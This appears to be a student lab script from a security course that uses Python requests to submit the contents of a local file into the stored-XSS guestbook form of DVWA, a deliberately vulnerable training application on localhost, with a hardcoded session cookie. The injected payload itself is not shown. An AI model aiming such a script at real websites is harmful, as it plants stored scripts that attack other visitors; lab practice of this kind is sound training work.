import requests

cookies = {'PHPSESSID':'t641pkf0pqmi3j262q9t84j766', 'security': 'low'}

url='http://127.0.0.1/dvwa/vulnerabilities/xss_s/'
form_input = open("/home/dakendall/Documents/ITP270_FALL2022/ITP270/Python Scripts/Security Scripts/keyboard_input.txt")
form_send = form_input.read()
form_data = {'txtName':'Test IT', 'mtxMessage':f"'{form_send}'", 'btnSign':'Sign+Guestbook'}
r = requests.post(url, cookies=cookies, data=form_data)
